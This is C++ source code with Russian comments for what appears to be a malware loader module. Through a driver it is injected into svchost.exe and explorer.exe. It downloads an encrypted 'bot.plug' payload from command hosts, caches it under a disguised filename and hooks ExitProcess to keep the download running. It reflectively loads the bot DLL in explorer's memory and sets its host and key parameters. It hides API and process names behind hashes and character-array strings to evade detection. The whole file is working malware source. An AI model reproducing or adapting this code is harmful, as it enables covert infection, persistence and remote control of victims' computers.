
#include <windows.h>
#include <shlobj.h>

#include "stdafx.h"
#include "BotCore.h"
#include "Splice.h"
#include "DllLoader.h"
#include "Plugins.h"
#include "DriverConnect.h"

//----------------------------------------------------------------------------
#include "BotDebug.h"

namespace LDRDEBGTEMPLATES
{
	#include "DbgTemplates.h"
}

#define LDRDBG LDRDEBGTEMPLATES::DBGOutMessage<>

//----------------------------------------------------------------------------


PWCHAR SVChostName = L"svchost.exe";


namespace DLLLoader
{
	typedef VOID (WINAPI *TExitProcess)(UINT Code);

	TExitProcess Real_ExitProcess = NULL;

    HANDLE ThreadHandle = NULL; // Хэндл запущенного потока

	DWORD ExplorerPID = 0;
	bool DLLLoadedInExplorer = false;


	const static char LoaderSignalFileName[] = {'\\', 'n', 't', 'l', 'd', 'l', '.', 'i', 'n', 'f',  0};

	//------------------------------------------------------------------------
	PCHAR GetSignalFileName()
	{
		// Функция возвращает имя сигнального файла

		// Определяем системный диск
		char WinDir[257];

		if (pGetWindowsDirectoryA(&WinDir[0], 256) == 0)
			return NULL;
        PCHAR Tmp = WinDir;
		while (*Tmp != ':') Tmp++;
		Tmp++;
		*Tmp = 0;
			
		// Создаём полнлё имя
		return STR::New(2, WinDir, (PCHAR)LoaderSignalFileName);
	}

	//------------------------------------------------------------------------

	VOID WINAPI Hook_ExitProcess(UINT Code)
	{
		// Попытка завершить процесс, если
		// запущен поток загрузки плагина, то дожидаемся его завершения
		if (ThreadHandle != NULL)
			pWaitForSingleObject(ThreadHandle, INFINITE);

		Real_ExitProcess(Code);
	}
	//------------------------------------------------------------------------

	void WaitExplorer()
	{
		// Функция ожидает запуска експлорера

		DWORD ID;
		DWORD I = 0;
		do
		{
			ID = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
			I++;
			if (ID == -1)
				pSleep(1000);
		}
		while (ID == -1 && I < 90);
	}
	//------------------------------------------------------------------------

	PCHAR GetBotPlugCacheFileName()
	{
		// Функция возвращает имя файла кэша плагина
		char Name[] = {'b', 'p', 'l', 'g', 'l', 's', 't', 'c', 'c', 'h', '.', 'c', 'a', 'c', 'h', 'e',  0};
		return BOT::GetWorkPathInSysDrive(NULL, Name);
	}

	//------------------------------------------------------------------------

	DWORD WINAPI DownloadMethod(LPVOID Data)
	{
		
       	// Функция загрузки плагина
		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

		DriverRemoveInjectToProcess(InitData, SVChostName);

		#ifdef DebugUtils
			DWORD Max = 10;
			for (DWORD i = 0; i < Max; i++)
			{
				LDRDBG("BRDS", "Ждём %d", DWORD(Max - i));
				pSleep(1000);
			}
		#endif
		
		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 8)");

				
		PCHAR FileName = GetBotPlugCacheFileName();
		if (FileName == NULL) return 0;

		PCHAR Password = GetMainPassword();
		if (Password == NULL)
		{
			STR::Free(FileName);
			return 0;
        }

		bool CallEventAfterDownload = true; //!FileExistsA(FileName);

		DWORD Size = 0;
		LPVOID Module = NULL;


		//Загружаем библиотеку

		LDRDBG("BRDS", "Инициализируем загрузку плагина!");

		const static char BotPlugin[] = {'b', 'o', 't', '.', 'p', 'l', 'u', 'g',  0};
     	Module = Plugin::Download((PCHAR)BotPlugin, NULL, &Size);
		if (Module != NULL)
		{
			// Сохраняем данные в кэш
			LDRDBG("BRDS", "Кешируем модуль бота. \r\n Имя файла '%s'", FileName);

			PCHAR Buf = RC2Crypt::Encode((LPBYTE)Module, Size, Password);
			DWORD Writen = File::WriteBufferA(FileName, Buf, STR::Length(Buf));
			STR::Free(Buf);

			LDRDBG("BRDS", "Записано %d", Writen);

            MemFree(Module);

			
			// передаем прочитанную длл в драйвер	
			// добавляем модуль для инжекта в процесс диспетчера задач

			// Уведомляем експлорер об успешной загрузке длл
			if (CallEventAfterDownload)
			{
				WaitExplorer();
				PCHAR Buf = "Ok: ";
				DriverSendDataToGlobalCallBack(InitData, &Buf, 4);
			}
		}

		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует

		STR::Free(FileName);
		STR::Free(Password);

		return 0;
	}


	//------------------------------------------------------------------------
	BOOL StartLoaderThread(LPVOID SystemArgument)
	{
		// Запускаем поток загружки длл
		
		//===================================================
		// Этап 1. Проверяем существование сигнального файда
		// Для этого создадим файл с экслюзивными праввами и
		// поставим его на удаление после перезапуска системы
		// Хэндл файла закрывать не будем, это даст чёткий
		// сигнал, что процесс запустивший загрузку ещё живой
		//===================================================
		PCHAR FileName = GetSignalFileName();
		if (FileName == NULL) return false;

		// Пытаемся открыть фай
		HANDLE H = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM , 0);
        if (H == INVALID_HANDLE_VALUE)
		{
			// Ошибка создания файла, считаем, что
			// в данный момент файлом владеет другой процесс
		   STR::Free(FileName);
		   return false;
		}

		// Указываем системе, что после перезапуска необходимо
		// удалить файл

        pMoveFileExA(FileName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);


		//===================================================
		// Этап 2: Устанавливаем хуки которые заблокируют
		// эавершение процесса до завершения работы нашего
		// потока
		//===================================================
		if ( HookApi(1, 0x95902B19 /* ExitProcess */, (DWORD)&Hook_ExitProcess ) )
			__asm mov [Real_ExitProcess], eax


		//===================================================
        //  Этап 3: Запускаем поток
		//===================================================
		ThreadHandle = StartThread(DownloadMethod, SystemArgument);
		if (ThreadHandle == NULL)
		{
			pCloseHandle(H);
			return false;
        }

		return true;
    }

	//------------------------------------------------------------------------
}


//---------------------------------------------------------------------

typedef BOOL (WINAPI *TSetParam)(DWORD ID, PCHAR Value);

TSetParam SetParamMethod;

void SetParam(DWORD ID)
{
	// Функция получает параметр лоадера
	DWORD Size = GetBotParameter(ID, NULL, 0);
	if (Size == 0) return;

	PCHAR Buf = STR::Alloc(Size + 1);
	GetBotParameter(ID, Buf, Size);

	SetParamMethod(ID, Buf);


	STR::Free(Buf);


}
//---------------------------------------------------------------------


void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
{

	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);


	if (Module == NULL)
	{
		LDRDBG("BRDS Explorer", "Не удалось загрузить длл в память");
		return;
    }

	const static char SetParamMethName[] = {'S', 'e', 't', 'B', 'o', 't', 'P', 'a', 'r', 'a', 'm', 'e', 't', 'e', 'r',  0};;
	SetParamMethod = (TSetParam)MemoryGetProcAddress(Module, (PCHAR)SetParamMethName);

	if (SetParamMethod != NULL)
	{
		// Устанавливаем параметры бота
		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота");
		SetParam(BOT_PARAM_PREFIX);
		SetParam(BOT_PARAM_HOSTS);
		SetParam(BOT_PARAM_KEY);
		SetParam(BOT_PARAM_DELAY);
	}


	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);

	TStart Method = (TStart)MemoryGetProcAddress(Module, "Start");

	if (Method != NULL)
	{
			LDRDBG("BRDS", "Запускаем бот");
			Method(NULL, NULL, NULL);

			DLLLoader::DLLLoadedInExplorer = true;
	}
}

//------------------------------------------------------------------------

bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
{
	LDRDBG("BRDS", "Запускаем длл бота");

	if (IsNewProcess(DLLLoader::ExplorerPID))
        DLLLoader::DLLLoadedInExplorer = false;

	if (DLLLoader::DLLLoadedInExplorer)
    	return true;


	// Получаем имя файла бота

	PCHAR FileName = DLLLoader::GetBotPlugCacheFileName();
	if (FileName == NULL)
		return false;

	// Получаем пароль шифрования
	PCHAR Password = GetMainPassword();
	if (Password == NULL)
	{
		STR::Free(FileName);
		return false;
    }

	// Ситаем содержимое файла
	DWORD Size = 0;
	LPBYTE Module = File::ReadToBufferA(FileName, Size);
	if (Module != NULL)
	{
		// Расшифровываем содержимое
		if (DelayBeforeStart != 0)
        	pSleep(DelayBeforeStart);

		RC2Crypt::Decode(Password, (PCHAR)Module, Size);
		if (IsExecutableFile(Module))
		{
			LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована");
            ExplorerLoadDLL(InitData, Module, Size);
		}
		MemFree(Module);
	}

	// Освобождаем данные
	STR::Free(FileName);
	STR::Free(Password);

	return DLLLoader::DLLLoadedInExplorer;
}
//------------------------------------------------------------------------

VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
{
	DoStartBotDll(PUSER_INIT_NOTIFY(Data), 0);
}


//------------------------------------------------------------------------

DWORD WINAPI ExplorerStartProc(LPVOID Data)
{
	
	if (Data == NULL) 
	{
		LDRDBG("BRDS", "Ошибочные данные для работы в эксплорере");
		return 0;
	}

	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;

	// Ожидаем пока драйвер отключит слежение за процессоь svchost.exe
	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);

	LDRDBG("BRDS", "Запуск потока експлорера");

	// Первым делом пытаемся запустить длл из файла
	
	if (DoStartBotDll(InitData, 5000))
	{
		LDRDBG("BRDS Explorer", "Бот успешно загружен из кэша");
		return 0;
	} 

	// Регистрируем событие обратной связи
	
	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
	{
		LDRDBG("BRDS", "Ошибка регистрации метода обратной свзи експлорера");
		return 0;
	}

	// Запускаем бесконечный цикл ожидания

	do
	{
		pSleepEx(10000, TRUE); 
		
	}while(1);

	return 0;
}
//------------------------------------------------------------------------

extern"C" __declspec(dllexport) VOID NTAPI  Start(
							PVOID  NormalContext /*системный указатель*/,
							PUSER_INIT_NOTIFY  SystemArgument1 /*аргумент который нужно сохранить чтоб использовать общение с драйвером*/,
							PVOID SystemArgument2/* ничего не передаеться*/)
{
	// стартуем поток загрузки длл
	if (SystemArgument1 == NULL)
		return;


	// определяем в каком процессе находимся
	char Name[MAX_PATH];
	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;

	PCHAR ShortName = File::ExtractFileNameA(Name, false);

	DWORD Hash = STR::GetHash(ShortName, 0, true);

	if (Hash == 0x2608DF01 /* svchost.exe */)
	{
		//PCHAR CL = (PCHAR)pGetCommandLineA();

		// Запускаем загрузку длл в процессе svchost.exe
		//if (STR::Pos(CL, "-k LocalService") >= 0)
			DLLLoader::StartLoaderThread(SystemArgument1);
	}
	if (Hash == 0x490A0972 /* explorer.exe */)
	{
		// Запускаем поток ожидания загружаемой длл в проводнике
		StartThread(ExplorerStartProc, SystemArgument1);
	}

};



